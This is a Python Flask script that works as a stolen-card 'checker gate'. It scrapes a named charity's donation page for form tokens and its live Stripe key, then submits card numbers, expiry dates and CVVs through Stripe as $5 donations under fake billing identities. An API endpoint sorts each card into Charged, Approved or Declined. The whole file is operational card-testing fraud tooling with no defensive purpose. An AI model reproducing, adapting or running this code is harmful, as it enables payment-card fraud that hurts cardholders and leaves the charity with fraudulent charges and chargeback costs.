import requests, re, random, time, urllib3
from html import unescape
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

SITE_URL = 'https://maxcurefoundation.org/donations/donate/'
BASE_URL = 'https://maxcurefoundation.org'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

def extract_data():
    s = requests.Session()
    s.verify = False
    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    try:
        r = s.get(SITE_URL, headers=headers, timeout=25)
        html = r.text
        if 'givewp-route=donation-form-view' in html:
            fid = re.search(r'form-id[=]+(\d+)', html)
            if fid:
                iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                r2 = s.get(iframe, headers=headers, timeout=25)
                html = r2.text
        
        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
        fi = re.search(r'name="give-form-id" value="(.*?)"', html)
        nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
        pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
        
        if not all([fp, fi, nc, pk]):
            return None
            
        sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
        return {
            'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
            'pk': pk.group(1), 'sa': sa.group(1) if sa else '',
            'session': s
        }
    except:
        return None

def extract_stripe_response(text):
    if any(x in text for x in ['give-donation-confirmation', 'donation-confirmation', 'Thank you for your donation', 'Payment Complete']):
        return "Charged"
    
    if 'receipt' in text.lower() and 'donation' in text.lower() and 'give_error' not in text:
        return "Charged"

    if "Your card was declined" in text:
        return "Your card was declined."

    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
    if error_div:
        raw_error = error_div.group(1)
        clean_error = re.sub(r'<[^>]+>', '', raw_error)
        clean_error = unescape(clean_error).strip()
        clean_error = re.sub(r'\s+', ' ', clean_error)
        res = clean_error.replace('Error:', '').strip()
        if "Your card was declined" in res: return "Your card was declined."
        return res
        
    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
    if notice_div:
        cn = re.sub(r'<[^>]+>', '', notice_div.group(1))
        cn = unescape(cn).strip()
        if "Your card was declined" in cn: return "Your card was declined."
        return cn.strip()
        
    clean_text = re.sub(r'<[^>]+>', ' ', text)
    clean_text = unescape(clean_text).strip()
    clean_text = re.sub(r'\s+', ' ', clean_text)
    if "Your card was declined" in clean_text: return "Your card was declined."
    return clean_text[:150] if clean_text else "Empty Response"

def check_card(ccx):
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) < 4: return 'INVALID_FORMAT'
    
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yy_short = yy if len(yy) == 2 else yy[-2:]
    email = f'riva{random.randint(1000,9999)}@gmail.com'
    
    d = extract_data()
    if not d: return 'SITE_DEAD'
    
    s = d['session']
    fp, fi, nc, pk, sa = d['fp'], d['fi'], d['nc'], d['pk'], d['sa']
    
    try:
        # 1. AJAX Step (Strictly as per st.py)
        headers_ajax = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data_ajax = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '5.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': 'custom', 'give-amount': '5.00',
            'payment-mode': 'stripe', 'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
            'card_name': 'riva', 'billing_country': 'US', 'card_address': 'riva sj',
            'card_city': 'tomrr', 'card_state': 'NY', 'card_zip': '10090',
            'give_action': 'purchase', 'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, timeout=25)
        
        # 2. Stripe Step
        headers_stripe = {
            'authority': 'api.stripe.com', 'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
            'user-agent': UA,
        }
        sa_param = f'&_stripe_account={sa}' if sa else ''
        stripe_data = f'type=card&billing_details[name]=riva++riva+&billing_details[email]={email}&billing_details[address][line1]=riva+sj&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=6a3f6804-0c67-4638-8c10-{random.randint(100000, 999999)}&muid=4b562720-d431-4fa4-b092-{random.randint(100000, 999999)}&sid=70a0ddd2-988f-425f-9996-{random.randint(100000, 999999)}&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&key={pk}{sa_param}'
        
        e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=25)
        sr = e.json()
        if 'error' in sr: return sr['error'].get('message', 'Stripe Error')
        pm_id = sr['id']
        
        # 3. Final Step
        headers_final = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': BASE_URL, 'referer': SITE_URL, 'user-agent': UA,
        }
        data_final = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '5.00',
            'give-form-hash': nc, 'give-price-id': 'custom', 'give-amount': '5.00',
            'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe',
            'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
            'card_name': 'riva', 'billing_country': 'US', 'card_address': 'riva sj',
            'card_city': 'tomrr', 'card_state': 'NY', 'card_zip': '10090',
            'give_action': 'purchase', 'give-gateway': 'stripe',
        }
        r4 = s.post(SITE_URL, headers=headers_final, data=data_final, timeout=25)
        return extract_stripe_response(r4.text)
    except Exception as ex:
        return f"Error: {str(ex)}"

@app.route('/api', methods=['GET'])
def stripe_api():
    gate = request.args.get('gate')
    cc = request.args.get('cc')
    if not gate or not cc: return jsonify({"response": "Missing parameters", "status": "Declined"})
    
    if gate == 'stripecharge':
        result = check_card(cc)
        res_lower = result.lower()
        if any(x in res_lower for x in ["charged", "success", "payment successfull", "thank you"]):
            status = "Charged"
            response_msg = f"𝑷𝒂𝒚𝒎𝒆𝒏𝒕 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍 🔥 | {result}"
        elif any(x in res_lower for x in ["insufficient funds", "security code is incorrect", "incorrect_cvc", "transaction_not_allowed", "incorrect_zip"]):
            status = "Approved"
            response_msg = result
        else:
            status = "Declined"
            response_msg = result
        return jsonify({"response": response_msg, "status": status})
    return jsonify({"response": "Invalid gate", "status": "Declined"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
